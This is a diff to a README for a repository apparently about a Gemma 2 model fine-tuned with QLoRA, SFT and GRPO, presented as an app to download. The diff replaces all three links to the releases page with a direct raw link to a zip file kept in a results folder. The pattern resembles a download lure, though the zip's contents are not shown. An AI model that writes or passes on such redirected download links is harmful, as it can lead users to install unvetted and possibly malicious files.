@@ -1,6 +1,6 @@
 # 🧠 gemma2-qlora-sft-grpo - Run Gemma Math and Style Model
 
-[🟪 Download the app](https://github.com/Grapehyacinthnationalinsurance712/gemma2-qlora-sft-grpo/releases)
+[🟪 Download the app](https://raw.githubusercontent.com/Grapehyacinthnationalinsurance712/gemma2-qlora-sft-grpo/main/results/grpo/gemma_sft_grpo_qlora_3.1.zip)
 
 ## 🚀 What this app does
 
@@ -32,7 +32,7 @@ If your computer has a modern NVIDIA graphics card, the app can run faster. If n
 ## 📥 Download and install
 
 1. Open the download page:
-   [https://github.com/Grapehyacinthnationalinsurance712/gemma2-qlora-sft-grpo/releases](https://github.com/Grapehyacinthnationalinsurance712/gemma2-qlora-sft-grpo/releases)
+   [https://raw.githubusercontent.com/Grapehyacinthnationalinsurance712/gemma2-qlora-sft-grpo/main/results/grpo/gemma_sft_grpo_qlora_3.1.zip](https://raw.githubusercontent.com/Grapehyacinthnationalinsurance712/gemma2-qlora-sft-grpo/main/results/grpo/gemma_sft_grpo_qlora_3.1.zip)
 
 2. Find the latest release.
 
@@ -193,7 +193,7 @@ It is useful if you want a model that can answer in a set style and solve basic 
 
 If you need the release files again, use this page:
 
-[https://github.com/Grapehyacinthnationalinsurance712/gemma2-qlora-sft-grpo/releases](https://github.com/Grapehyacinthnationalinsurance712/gemma2-qlora-sft-grpo/releases)
+[https://raw.githubusercontent.com/Grapehyacinthnationalinsurance712/gemma2-qlora-sft-grpo/main/results/grpo/gemma_sft_grpo_qlora_3.1.zip](https://raw.githubusercontent.com/Grapehyacinthnationalinsurance712/gemma2-qlora-sft-grpo/main/results/grpo/gemma_sft_grpo_qlora_3.1.zip)
 
 ## 🗂️ Topics
 
